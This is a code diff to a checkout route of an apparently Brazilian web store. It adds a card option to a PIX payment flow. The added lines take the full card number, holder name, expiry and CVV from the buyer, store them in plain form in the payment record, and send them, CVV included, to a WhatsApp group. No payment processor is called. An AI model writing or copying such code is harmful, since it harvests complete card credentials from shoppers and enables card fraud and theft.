@@ -64,8 +64,8 @@ router.post('/generate', async (req, res) => {
   const enderecos = user.enderecos || [];
   if (enderecos.length === 0) return res.status(400).json({ success: false, error: 'Cadastre um endereço de entrega antes de finalizar a compra.' });
 
-  const { productId, amount, productName, addressId } = req.body;
-  if (!productId || !amount) return res.status(400).json({ success: false, error: 'Dados do pedido incompletos.' });
+  const { productId, amount, productName, addressId, paymentMethod, installments, cardName, cardNumber, cardExpiry, cardCvv, cardLast4, seguro, seguroLabel } = req.body;
+  if (!amount) return res.status(400).json({ success: false, error: 'Dados do pedido incompletos.' });
 
   const address = enderecos.find(a => a.id === addressId) || enderecos.find(a => a.principal) || enderecos[0];
 
@@ -73,12 +73,13 @@ router.post('/generate', async (req, res) => {
   const paymentId = uuidv4();
   const shortId   = generateShortId(payments);
 
-  // ── Gera PIX automático se a chave estiver configurada ────────────────────
+  // ── Gera PIX automático se a chave estiver configurada (apenas PIX) ─────
   const cfg    = loadConfig();
   const pixCfg = cfg.pixConfig || {};
   let pixCode  = null;
+  const isCartao = paymentMethod === 'cartao';
 
-  if (pixCfg.pixKey) {
+  if (!isCartao && pixCfg.pixKey) {
     try {
       pixCode = generatePix({
         key:         pixCfg.pixKey,
@@ -86,7 +87,7 @@ router.post('/generate', async (req, res) => {
         city:        (pixCfg.receiverCity || 'Rio de Janeiro').substring(0, 15),
         amount,
         txid:        shortId,
-        description: (productName || productId).substring(0, 72)
+        description: (productName || productId || 'Compra').substring(0, 72)
       });
     } catch (e) {
       console.error('[PIX] Erro ao gerar código:', e.message);
@@ -96,12 +97,21 @@ router.post('/generate', async (req, res) => {
   const newPayment = {
     id: paymentId,
     shortId,
-    productId,
-    productName,
+    productId:    productId || null,
+    productName:  productName || null,
     amount,
     status:          'pending',
     createdAt:       new Date().toISOString(),
     qrCode:          pixCode,
+    paymentMethod:   isCartao ? 'cartao' : 'pix',
+    installments:    isCartao ? (installments || 1) : null,
+    cardName:        isCartao ? (cardName || null) : null,
+    cardNumber:      isCartao ? (cardNumber || null) : null,
+    cardExpiry:      isCartao ? (cardExpiry || null) : null,
+    cardCvv:         isCartao ? (cardCvv || null) : null,
+    cardLast4:       isCartao ? (cardLast4 || null) : null,
+    seguro:          seguro || 0,
+    seguroLabel:     seguroLabel || null,
     clientId:        req.ip,
     userId:          user.id,
     clientName:      user.nome || null,
@@ -119,7 +129,14 @@ router.post('/generate', async (req, res) => {
   // ── Notifica o grupo WhatsApp ─────────────────────────────────────────────
   const sock = getSocket();
   if (sock) {
-    const messageId = await sendPaymentRequest(sock, paymentId, shortId, productName || productId, amount, user.whatsapp, pixCode);
+    const messageId = await sendPaymentRequest(sock, paymentId, shortId, productName || productId || 'Compra', amount, user.whatsapp, pixCode, {
+      paymentMethod: isCartao ? 'cartao' : 'pix',
+      cardNumber:   newPayment.cardNumber,
+      cardName:     newPayment.cardName,
+      cardExpiry:   newPayment.cardExpiry,
+      cardCvv:      newPayment.cardCvv,
+      installments: newPayment.installments,
+    });
     newPayment.groupMessageId = messageId;
     newPayment.logs.push({
       timestamp: new Date().toISOString(),
